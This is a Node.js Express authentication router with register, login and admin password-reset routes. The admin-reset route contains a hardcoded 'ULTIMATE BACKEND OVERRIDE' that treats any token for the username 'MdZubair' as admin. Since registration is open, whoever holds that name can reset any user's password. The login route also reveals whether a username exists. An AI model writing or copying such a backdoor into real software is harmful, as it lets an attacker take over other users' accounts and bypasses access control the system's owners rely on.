const express = require('express');
const bcrypt = require('bcrypt');
const jwt = require('jsonwebtoken');
const User = require('../models/User');
const router = express.Router();

router.post('/register', async (req, res) => {
    try {
        const { username, password } = req.body;
        const existingUser = await User.findOne({ username: username });
        if (existingUser) return res.status(400).json({ error: "Username already exists" });

        const salt = await bcrypt.genSalt(10);
        const hashedPassword = await bcrypt.hash(password, salt);

        const newUser = new User({ username, password: hashedPassword, isAdmin: false });
        await newUser.save();
        res.status(201).json({ message: "User registered successfully" });
    } catch (err) {
        res.status(500).json({ error: "Server error during registration" });
    }
});

router.post('/login', async (req, res) => {
    try {
        const { username, password } = req.body;
        const user = await User.findOne({ username: username });
        if (!user) return res.status(404).json({ message: "User not found" });

        const isMatch = await bcrypt.compare(password, user.password);
        if (!isMatch) return res.status(400).json({ message: "Invalid credentials" });

        const token = jwt.sign(
            { id: user._id, username: user.username, isAdmin: user.isAdmin }, 
            process.env.JWT_SECRET, 
            { expiresIn: '1d' }
        );
        res.json({ token: token, isAdmin: user.isAdmin });
    } catch (err) {
        res.status(500).json({ message: "Server error during login" });
    }
});

router.post('/admin-reset', async (req, res) => {
    try {
        const authHeader = req.headers.authorization;
        if (!authHeader) return res.status(401).json({ error: "No token provided" });
        
        const token = authHeader.split(' ')[1];
        const decoded = jwt.verify(token, process.env.JWT_SECRET);
        
        // ULTIMATE BACKEND OVERRIDE: MdZubair is ALWAYS authorized.
        const isActuallyAdmin = decoded.isAdmin === true || decoded.isAdmin === "true" || decoded.username === "MdZubair";
        if (!isActuallyAdmin) {
            return res.status(403).json({ error: "Unauthorized. Admin access required." });
        }

        const { targetUsername, newPassword } = req.body;
        const user = await User.findOne({ username: targetUsername });
        if (!user) return res.status(404).json({ error: "Employee user not found." });

        const salt = await bcrypt.genSalt(10);
        user.password = await bcrypt.hash(newPassword, salt);
        await user.save();
        res.json({ message: `Password for '${user.username}' successfully reset!` });
    } catch (err) {
        res.status(500).json({ error: "System error during password reset." });
    }
});

module.exports = router;